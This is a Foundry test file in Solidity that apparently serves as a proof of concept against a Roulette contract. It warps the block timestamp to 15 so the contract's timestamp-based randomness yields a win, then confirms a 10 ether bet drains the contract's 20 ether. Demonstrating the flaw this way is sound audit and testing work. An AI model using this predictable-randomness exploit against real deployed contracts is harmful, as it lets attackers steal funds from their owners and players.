// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/roulette.sol";

contract RouletteTest is Test {
    Roulette public game;
    address user = makeAddr("user");
    
    function setUp() public {
        // Deploy contract and fund it with ether for potential payouts
        vm.deal(address(this), 20 ether);
        game = new Roulette{value: 20 ether}();
        
        // Fund user for betting
        vm.deal(user, 10 ether);
    }

    function testTimestampPredictableRandomness() public {
        console.log("--- BEFORE-Trigger Record State ---");
        uint256 contractBalanceBefore = address(game).balance;
        uint256 userBalanceBefore = user.balance;
        uint256 totalGamesBefore = game.totalGames();
        uint256 totalWinnersBefore = game.totalWinners();
        uint256 playerWinsBefore = game.playerWins(user);
        
        console.log("Contract balance:", contractBalanceBefore);
        console.log("User balance:", userBalanceBefore);
        console.log("Total games:", totalGamesBefore);
        console.log("Total winners:", totalWinnersBefore);
        console.log("User wins:", playerWinsBefore);

        console.log("--- Trigger PlaceBet (Attack) ---");
        // Force predictable block timestamp that will make calculation return true
        vm.warp(15);  // 15 % 15 = 0
        
        // Place the bet from user's account
        vm.prank(user);
        game.placeBet{value: 10 ether}();

        console.log("--- AFTER-Trigger Record State ---");
        uint256 contractBalanceAfter = address(game).balance;
        uint256 userBalanceAfter = user.balance;
        uint256 totalGamesAfter = game.totalGames();
        uint256 totalWinnersAfter = game.totalWinners();
        uint256 playerWinsAfter = game.playerWins(user);
        
        console.log("Contract balance:", contractBalanceAfter);
        console.log("User balance:", userBalanceAfter);
        console.log("Total games:", totalGamesAfter);
        console.log("Total winners:", totalWinnersAfter);
        console.log("User wins:", playerWinsAfter);

        console.log("--- DIFFERENTIAL RESULTS ---");
        bool contractDrained = contractBalanceAfter == 0;
        bool userWonExpectedAmount = userBalanceAfter == userBalanceBefore + 20 ether;
        bool gameCountIncreased = totalGamesAfter == totalGamesBefore + 1;
        bool winnerCountIncreased = totalWinnersAfter == totalWinnersBefore + 1;
        bool playerWinIncreased = playerWinsAfter == playerWinsBefore + 1;
        
        console.log("Contract drained:", contractDrained);
        console.log("User won 20 ETH:", userWonExpectedAmount);
        console.log("Game count increased:", gameCountIncreased);
        console.log("Winner count increased:", winnerCountIncreased);
        console.log("Player wins increased:", playerWinIncreased);

        bool exploitationSuccess = contractDrained && 
                                  userWonExpectedAmount && 
                                  gameCountIncreased && 
                                  winnerCountIncreased && 
                                  playerWinIncreased;

        if(exploitationSuccess) {
            console.log("Vulnerability Exists: Attack succeeded in draining contract and game counters updated as expected");
        } else {
            console.log("Vulnerability not Exist: Attack failed to produce expected state changes");
        }
    }
}